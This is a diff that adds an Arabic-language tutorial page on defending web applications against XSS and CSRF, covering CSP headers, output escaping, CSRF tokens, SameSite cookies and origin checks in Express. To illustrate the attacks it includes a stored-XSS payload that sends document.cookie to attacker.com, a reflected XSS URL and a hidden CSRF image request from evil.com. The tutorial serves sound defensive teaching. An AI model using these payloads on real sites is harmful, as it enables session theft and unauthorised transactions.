@@ -1,0 +1,217 @@
+---
+title: "الحماية من XSS و CSRF"
+description: "XSS و CSRF بالعربي: أنواع هجمات XSS، الوقاية بـ CSP، CSRF tokens."
+order: 5
+keywords: ["xss prevention", "csrf protection", "csp headers", "cross site scripting"]
+---
+
+## XSS (Cross-Site Scripting)
+
+XSS هي ثغرة تسمح للمهاجم بحقن سكريبتات ضارة في صفحات ويب يشاهدها مستخدمون آخرون.
+
+### أنواع XSS
+
+### 1. Stored XSS (مخزّن)
+
+السكريبت الضار يُخزّن في قاعدة البيانات ويُعرض لكل المستخدمين.
+
+```javascript
+// تعليق خبيث يخزن في قاعدة البيانات
+{
+  "comment": "<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>"
+}
+
+// عند عرض التعليق، ينفذ السكريبت في متصفح كل زائر
+```
+
+### 2. Reflected XSS (منعكس)
+
+السكريبت يأتي من الطلب نفسه (مثل Query Parameter) وينعكس في الاستجابة.
+
+```text
+URL خبيث:
+  https://example.com/search?q=<script>alert('XSS')</script>
+
+إذا عكس التطبيق q مباشرة في الصفحة دون تعقيم، ينفذ السكريبت.
+```
+
+### 3. DOM-based XSS
+
+الثغرة في كود JavaScript من جهة العميل وليس في استجابة الخادم.
+
+```javascript
+// سيئ - كتابة مدخل المستخدم مباشرة في DOM
+const name = new URLSearchParams(window.location.search).get('name');
+document.getElementById('welcome').innerHTML = `مرحبا ${name}`;
+
+// جيد - استخدام textContent بدلا من innerHTML
+document.getElementById('welcome').textContent = `مرحبا ${name}`;
+```
+
+## الحماية من XSS
+
+### Content Security Policy (CSP)
+
+CSP هو HTTP Header يحدد المصادر المسموح بتحميل المحتوى منها.
+
+```text
+Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'
+```
+
+```javascript
+// إعداد CSP في Express
+const helmet = require('helmet');
+
+app.use(helmet.contentSecurityPolicy({
+  directives: {
+    defaultSrc: ["'self'"],
+    scriptSrc: ["'self'", "https://trusted-cdn.com"],
+    styleSrc: ["'self'", "'unsafe-inline'"],
+    imgSrc: ["'self'", "data:", "https://images.example.com"],
+    objectSrc: ["'none'"],
+    upgradeInsecureRequests: []
+  }
+}));
+```
+
+### تعقيم المخرجات
+
+```javascript
+// سيئ
+res.send(`<div>${userInput}</div>`);
+
+// جيد - تشفير HTML entities
+const escapeHtml = (str) => {
+  return str
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#039;');
+};
+
+res.send(`<div>${escapeHtml(userInput)}</div>`);
+
+// أفضل - استخدام template engine مع auto-escaping
+res.render('template', { userInput }); // EJS, Pug, Handlebars
+```
+
+## CSRF (Cross-Site Request Forgery)
+
+CSRF يجبر المستخدم على تنفيذ إجراءات غير مرغوب فيها على موقع آخر حيث هو مسجل الدخول.
+
+### كيف تعمل هجمة CSRF
+
+```text
+1. المستخدم مسجل الدخول في example.com
+2. المستخدم يزور موقع المهاجم evil.com
+3. evil.com يرسل طلب مخفي إلى example.com/api/transfer
+4. المتصفح يرسل الكوكيز تلقائيا → ينفذ التحويل
+```
+
+```html
+<!-- صفحة evil.com ترسل طلب مخفي -->
+<img src="https://example.com/api/transfer?to=attacker&amount=1000" style="display:none" />
+```
+
+## الحماية من CSRF
+
+### 1. CSRF Tokens
+
+```javascript
+// توليد token وإرساله مع النموذج
+const crypto = require('crypto');
+
+function generateCsrfToken(req) {
+  const token = crypto.randomBytes(32).toString('hex');
+  req.session.csrfToken = token;
+  return token;
+}
+
+// التحقق من token في الطلبات
+function csrfProtection(req, res, next) {
+  const token = req.body._csrf || req.headers['x-csrf-token'];
+  if (token !== req.session.csrfToken) {
+    return res.status(403).json({ error: 'طلب غير مصرح' });
+  }
+  next();
+}
+```
+
+### 2. SameSite Cookies
+
+يمنع المتصفح إرسال الكوكيز عبر المواقع الأخرى.
+
+```javascript
+// SameSite=Strict: لا يرسل الكوكيز أبدا عبر مواقع أخرى
+res.cookie('session', token, {
+  httpOnly: true,
+  secure: true,
+  sameSite: 'strict'
+});
+
+// SameSite=Lax: يسمح بالروابط العادية (GET) فقط
+res.cookie('session', token, {
+  httpOnly: true,
+  secure: true,
+  sameSite: 'lax'
+});
+```
+
+### 3. التحقق من Origin/Referer Header
+
+```javascript
+function checkOrigin(req, res, next) {
+  const allowedOrigins = ['https://example.com'];
+  const origin = req.headers.origin;
+  const referer = req.headers.referer;
+
+  if (!origin && !referer) {
+    return res.status(403).json({ error: 'ممنوع' });
+  }
+
+  if (origin && !allowedOrigins.includes(origin)) {
+    return res.status(403).json({ error: 'ممنوع' });
+  }
+
+  next();
+}
+```
+
+## ملخص الحماية
+
+```text
+XSS:
+  ✅ CSP Headers
+  ✅ تعقيم المخرجات (Output Encoding)
+  ✅ تجنب dangerouslySetInnerHTML / innerHTML
+  ✅ التحقق من المدخلات
+
+CSRF:
+  ✅ CSRF Tokens
+  ✅ SameSite=Strict/Lax
+  ✅ التحقق من Origin Header
+  ✅ POST/PUT/DELETE للعمليات الحساسة (ليس GET)
+```
+
+```javascript
+// إعداد كامل لـ Express
+const helmet = require('helmet');
+const csrf = require('csurf');
+
+app.use(helmet()); // يشمل CSP, XSS Filter, وغيرها
+app.use(csrf({ cookie: true }));
+
+app.get('/form', (req, res) => {
+  res.render('form', { csrfToken: req.csrfToken() });
+});
+
+app.post('/submit', (req, res) => {
+  // csrf middleware يتحقق من token تلقائيا
+  res.json({ success: true });
+});
+```
+
+> ⚠️ XSS هي أكثر ثغرات الويب انتشارا. استخدم CSP دائما ولا تعتمد على المتصفح وحده للحماية.
+
+> 🎯 التالي: [تحديد معدل الطلبات (Rate Limiting)](/tracks/api-security/06-rate-limiting)
